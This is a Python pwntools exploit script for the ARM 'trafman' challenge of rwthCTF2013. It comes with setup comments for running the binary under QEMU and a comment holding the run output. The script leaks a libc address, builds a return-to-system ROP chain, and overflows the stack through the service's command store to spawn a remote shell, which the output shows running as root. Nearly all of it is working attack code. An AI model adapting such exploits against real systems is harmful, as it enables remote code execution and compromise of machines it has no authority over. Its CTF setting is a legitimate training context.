#!/usr/bin/env python2
#Exploit for challenge trafman of rwthCTF2013.
#
#Launch arm binary directly on an i386 system:
#Ref: https://gist.github.com/zachriggle/8396235f532e1aeb146d
#   apt-get install qemu-user-static libc6-armhf-cross
#   mkdir /etc/qemu-binfmt
#   ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm
#
#Create a directory named db next to the trafman binary.

from pwn import *

#io = process("./trafman")
#libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")
io = remote("192.168.100.2", 8000)
libc = ELF("libc.so.6")

io.sendlineafter("Username: ", "traffic_operator")

objectID = "A"*40

#Step1: Leak libc base address.
io.sendlineafter("number:\n", "23")
data = io.recvline_startswith(">")

printf_addr = int(data.split(" ")[1][2:], 16)
libc.address = printf_addr - libc.symbols["printf"]

binsh = libc.search("/bin/sh\x00").next()

#Step2: Build ROP chain. return-to-system.
# Segmentation fault at: 0x63616174
offset = cyclic_find(p32(0x63616174))
padding = cyclic(offset) 

rop = ROP(libc)
rop.system(binsh)

print rop.dump()

padding += rop.chain()

#Step3: Execute Command, make a file which length is large than stack.
io.sendlineafter("number:\n", "2")
io.sendlineafter("):\n", objectID)
io.sendlineafter("command:\n", padding)

#Step4: Get Command, triger stack overflow, spawn a shell.
io.sendlineafter("number:\n", "1")
io.sendlineafter("command for:\n", objectID)
io.interactive()

'''
[+] Opening connection to 192.168.100.2 on port 8000: Done
[*] '/home/lieanu/ctf/armpwn/rwthCTF2013/libc.so.6'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for 'libc.so.6'
0x0000:       0x76e8a7dc (pop {r0, r4, pc})
0x0004:       0x76efba5c
0x0008:           '$$$$'
0x000c:       0x76e5f7e9 (__libc_system)
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$  
'''
